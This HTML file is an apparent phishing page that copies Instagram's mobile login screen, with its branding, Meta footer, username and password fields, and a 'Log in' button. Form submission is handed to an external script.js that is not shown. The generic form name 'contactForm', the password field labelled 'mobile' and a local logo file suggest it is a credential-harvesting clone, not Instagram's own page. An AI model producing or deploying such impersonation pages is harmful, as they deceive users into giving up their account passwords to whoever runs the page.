<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>Instagram</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    }

    html {
      height: 100%;
    }

    body {
      background: #121d24;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: space-between;
      height: 100vh;
      height: 100dvh; /* Mobile browser address bar fix */
      padding: 10px 20px 12px 20px;
      overflow: hidden;
    }

    .lang-top {
      width: 100%;
      text-align: center;
      color: #92a4b0;
      font-size: 13px;
      margin-top: 2px;
      user-select: none;
    }

    .card {
      width: 100%;
      max-width: 360px;
      text-align: center;
      display: flex;
      flex-direction: column;
      align-items: center;
      margin: auto 0;
    }

    .dp {
      width: 60px;
      height: 60px;
      display: block;
      object-fit: contain;
      margin: 0 auto 28px auto;
    }

    form {
      width: 100%;
    }

    .input-box {
      position: relative;
      margin-bottom: 10px;
      width: 100%;
    }

    .input-box input {
      width: 100%;
      height: 48px;
      background: #1b2831;
      border: 1px solid #2d3e4a;
      border-radius: 12px;
      padding: 0 42px 0 14px;
      font-size: 13.5px;
      color: #ffffff;
      outline: none;
      text-overflow: ellipsis;
    }

    .input-box input::placeholder {
      color: #728491;
      font-size: 13px;
    }

    .input-box input:focus {
      border-color: #0064e0;
    }

    .eye-btn {
      position: absolute;
      right: 14px;
      top: 50%;
      transform: translateY(-50%);
      cursor: pointer;
      color: #728491;
      display: flex;
      align-items: center;
    }

    .eye-btn .eye-closed {
      display: none;
    }

    .eye-btn.active .eye-open {
      display: none;
    }

    .eye-btn.active .eye-closed {
      display: block;
      color: #0064e0;
    }

    button[type="submit"] {
      width: 100%;
      height: 44px;
      background: #0064e0;
      border: none;
      border-radius: 22px;
      color: #ffffff;
      font-size: 14px;
      font-weight: 600;
      cursor: pointer;
      margin-top: 4px;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .forgot-pass {
      color: #e4e6eb;
      font-size: 14px;
      font-weight: 600;
      margin-top: 16px;
      cursor: pointer;
      user-select: none;
    }

    .footer-area {
      width: 100%;
      max-width: 360px;
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 8px;
      padding-bottom: 4px;
    }

    .create-acc-btn {
      width: 100%;
      height: 42px;
      border: 1px solid #1f3f60;
      border-radius: 21px;
      color: #3897f0;
      font-size: 14px;
      font-weight: 600;
      display: flex;
      align-items: center;
      justify-content: center;
      cursor: pointer;
      background: transparent;
    }

    .meta-footer {
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 5px;
      color: #cbd5e1;
      font-size: 14px;
      font-weight: 600;
      user-select: none;
    }

    .meta-icon {
      width: 16px;
      height: 16px;
      fill: #cbd5e1;
    }

    .spinner {
      display: none;
      width: 18px;
      height: 18px;
      border: 2px solid rgba(255, 255, 255, 0.3);
      border-top: 2px solid #ffffff;
      border-radius: 50%;
      animation: spin 0.8s linear infinite;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    button.loading .btn-text {
      display: none;
    }

    button.loading .spinner {
      display: block;
    }
  </style>
</head>

<body>

  <div class="lang-top">English (UK)</div>

  <div class="card">

    <img src="Insta2.jpg" class="dp" alt="Instagram Logo">

    <form id="contactForm">

      <div class="input-box">
        <input type="text" id="name" placeholder="Username, email address or mobile number" required>
      </div>

      <div class="input-box">
        <input type="password" id="mobile" placeholder="Password" required>
        
        <span id="togglePassword" class="eye-btn">
          <svg class="eye-open" viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
            <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
            <circle cx="12" cy="12" r="3"></circle>
          </svg>
          <svg class="eye-closed" viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
            <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"></path>
            <line x1="1" y1="1" x2="23" y2="23"></line>
          </svg>
        </span>
      </div>

      <button type="submit" id="loginBtn">
        <span class="btn-text">Log in</span>
        <span class="spinner" id="spinner"></span>
      </button>

    </form>

    <div class="forgot-pass">Forgotten password?</div>

  </div>

  <div class="footer-area">
    <div class="create-acc-btn">Create new account</div>

    <div class="meta-footer">
      <svg class="meta-icon" viewBox="0 0 24 24">
        <path d="M12 10.2c-1.3-1.8-3-2.7-4.8-2.7-3.1 0-5.2 2.2-5.2 5 0 3.3 2.9 5.8 6.4 5.8 1.5 0 2.9-.6 4-1.8 1.1 1.2 2.5 1.8 4 1.8 3.5 0 6.4-2.5 6.4-5.8 0-2.8-2.1-5-5.2-5-1.8 0-3.5.9-4.8 2.7zm-4.8.3c1.3 0 2.5.8 3.3 2.1-1 1.6-2.3 3.1-3.7 3.1-1.9 0-3.2-1.3-3.2-3.1 0-1.3 1.1-2.1 2.6-2.1zm8.4 5.2c-1.4 0-2.7-1.5-3.7-3.1.8-1.3 2-2.1 3.3-2.1 1.5 0 2.6.8 2.6 2.1 0 1.8-1.3 3.1-3.2 3.1z"/>
      </svg>
      <span>Meta</span>
    </div>
  </div>

  <script src="script.js"></script>

</body>
</html>
